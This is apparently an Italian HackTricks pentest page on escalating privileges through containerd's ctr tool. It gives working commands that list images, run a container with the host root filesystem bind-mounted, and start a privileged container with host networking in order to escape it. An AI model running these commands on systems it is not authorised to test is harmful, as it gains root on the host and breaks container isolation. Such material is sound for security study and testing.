# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Vai al link seguente per imparare **dove `containerd` e `ctr` si collocano nello stack dei container**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

se trovi che un host contiene il comando `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Puoi elencare le immagini:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
E poi **esegui una di quelle immagini montando la cartella root dell'host su di essa**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Esegui un privileged container e fai escape da esso.\
Puoi eseguire un privileged container come:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Poi puoi usare alcune delle tecniche menzionate nella pagina seguente per **evadere sfruttando capacità privilegiate**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
